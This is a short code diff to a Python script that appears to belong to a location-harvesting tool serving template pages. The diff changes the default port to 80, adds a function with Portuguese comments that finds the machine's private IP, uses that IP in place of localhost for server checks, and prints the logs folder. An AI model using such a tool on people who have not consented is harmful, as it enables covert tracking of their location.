@@ -21,7 +21,7 @@ from packaging import version
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-k', '--kml', help='KML filename')
-parser.add_argument('-p', '--port', type=int, default=8080, help='Web server port [ Default : 8080 ]')
+parser.add_argument('-p', '--port', type=int, default=80, help='Web server port [ Default : 80 ]')
 parser.add_argument('-u', '--update', action='store_true', help='Check for updates')
 parser.add_argument('-v', '--version', action='store_true', help='Prints version')
 parser.add_argument('-t', '--template', type=int, help='Load template and loads parameters from env variables')
@@ -127,6 +127,20 @@ def banner():
 	utils.print(f'{G}[>] {C}Version      : {W}{VERSION}\n')
 
 
+def get_private_ip():
+    try:
+        # Cria um socket temporário para obter o IP privado
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.settimeout(0)
+        # Conecta a um endereço público, mas não envia dados
+        s.connect(('8.8.8.8', 1))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception as e:
+        print(f'[ERROR] Não foi possível obter o IP privado: {e}')
+        return '127.0.0.1'
+	    
 def send_webhook(content, msg_type):
 	if webhook is not None:
 		if not webhook.lower().startswith('http://') and not webhook.lower().startswith('https://'):
@@ -198,7 +212,6 @@ def template_select(site):
 	shutil.copyfile('js/location.js', jsdir + '/location.js')
 	return site
 
-
 def server():
 	print()
 	port_free = False
@@ -208,7 +221,8 @@ def server():
 
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
 		try:
-			sock.connect(('127.0.0.1', port))
+			private_ip = get_private_ip()
+			sock.connect((private_ip, port))
 		except ConnectionRefusedError:
 			port_free = True
 
@@ -249,7 +263,8 @@ def server():
 		sleep(3)
 
 		try:
-			php_rqst = requests.get(f'http://127.0.0.1:{port}/index.html')
+			private_ip = get_private_ip()
+			php_rqst = requests.get(f'http://{private_ip}:{port}/index.html')
 			php_sc = php_rqst.status_code
 			if php_sc == 200:
 				utils.print(f'{C}[ {G}✔{C} ]{W}')
@@ -269,6 +284,7 @@ def wait():
 		size = path.getsize(RESULT)
 		if size == 0 and printed is False:
 			utils.print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
+			print(f" Logs folder: {LOG_DIR}")
 			printed = True
 		if size > 0:
 			data_parser()
